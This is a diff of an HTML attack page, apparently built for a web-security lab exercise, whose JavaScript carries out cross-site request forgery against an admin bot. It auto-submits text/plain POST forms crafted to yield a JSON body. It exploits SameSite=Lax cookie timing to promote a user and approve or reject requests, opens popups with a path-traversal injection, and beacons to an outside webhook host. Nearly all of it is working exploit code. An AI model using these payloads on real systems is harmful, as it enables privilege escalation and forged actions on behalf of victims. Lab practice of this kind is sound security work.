@@ -3,12 +3,12 @@
 <head><meta charset="utf-8"></head>
 <body>
 <script>
-// v10: adds auto-submitting TOP-LEVEL POST forms (text/plain -> JSON-ish body).
-// Lax+POST: Chrome sends SameSite=Lax cookies on top-level cross-site POSTs
-// within ~2 minutes of cookie creation (fresh bot session qualifies).
-//   t=formpromote  POST api/users/joseph/promote      (the win)
-//   t=formapprove  POST api/requests/<r>/approve      (alternate win)
-//   t=formreject   POST api/requests/<r>/reject       (VISIBLE oracle: #r flips)
+// v11: popup delivery + loop-back report POST.
+//   t=popweb      window.open(webhook /popup)                — popup capability probe
+//   t=popchall    window.open(challenge reject-injection)    — popup = top-level ctx -> Lax cookie attaches -> admin.js fires -> #7 flips
+//   t=anchchall   <a target=_blank>.click() same target      — alternative popup path
+//   t=formreport  auto-POST form -> challenge ?view=report   — report form has NO csrf; loop: server queues URL -> bot visits webhook /adminqueued
+//   (v8-v10 modes retained: reject/promote/aget/pjoseph/extnav/form*)
 var W    = 'https://swift-stream-09.webhook.cool';
 var BASE = 'https://10.20.18.55:2070/labs/assignment03/environment/1/';
 var q    = new URLSearchParams(location.search);
@@ -18,18 +18,39 @@ var tag  = mode + '-' + rid;
 
 try { fetch(W + '/c1?tag=' + encodeURIComponent(tag) + '&t=' + Date.now(), { keepalive: true, mode: 'no-cors' }); } catch (e) {}
 
-if (mode === 'formpromote' || mode === 'formapprove' || mode === 'formreject') {
+function submitPOST(action, fields) {
+  var f = document.createElement('form');
+  f.method = 'POST'; f.action = action;
+  for (var k in fields) {
+    var i = document.createElement('input');
+    i.type = 'hidden'; i.name = k; i.value = fields[k];
+    f.appendChild(i);
+  }
+  document.body.appendChild(f);
+  f.submit();
+}
+
+if (mode === 'popweb') {
+  window.open(W + '/popup');
+} else if (mode === 'popchall') {
+  window.open(BASE + '?view=admin&request=../requests/' + rid + '/reject?/seen');
+} else if (mode === 'anchchall') {
+  var a = document.createElement('a');
+  a.href = BASE + '?view=admin&request=../requests/' + rid + '/reject?/seen';
+  a.target = '_blank';
+  document.body.appendChild(a);
+  a.click();
+} else if (mode === 'formreport') {
+  submitPOST(BASE + '?view=report', { report_url: W + '/adminqueued' });
+} else if (mode === 'formpromote' || mode === 'formapprove' || mode === 'formreject') {
   var action;
   if      (mode === 'formpromote') action = BASE + 'api/users/joseph/promote';
   else if (mode === 'formapprove') action = BASE + 'api/requests/' + rid + '/approve';
   else                             action = BASE + 'api/requests/' + rid + '/reject';
   var f = document.createElement('form');
-  f.method = 'POST';
-  f.enctype = 'text/plain';
-  f.action = action;
+  f.method = 'POST'; f.enctype = 'text/plain'; f.action = action;
   var i = document.createElement('input');
-  i.name = '{"a":"b","x":"';   // body becomes {"a":"b","x":"=}  — valid JSON
-  i.value = '"}';
+  i.name = '{"a":"b","x":"'; i.value = '"}';
   f.appendChild(i);
   document.body.appendChild(f);
   f.submit();
